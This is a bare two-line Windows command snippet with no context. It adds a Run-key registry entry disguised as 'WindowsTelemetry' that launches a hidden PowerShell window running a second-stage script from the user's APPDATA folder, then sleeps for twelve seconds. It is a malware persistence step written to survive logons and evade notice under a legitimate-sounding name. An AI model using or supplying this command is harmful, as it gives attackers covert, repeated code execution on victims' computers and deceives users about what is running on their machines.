
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetry" /t REG_SZ /d "powershell.exe -NoP -WindowStyle Hidden -File $env:APPDATA\stage2.ps1" /f
Start-Sleep -Seconds 12
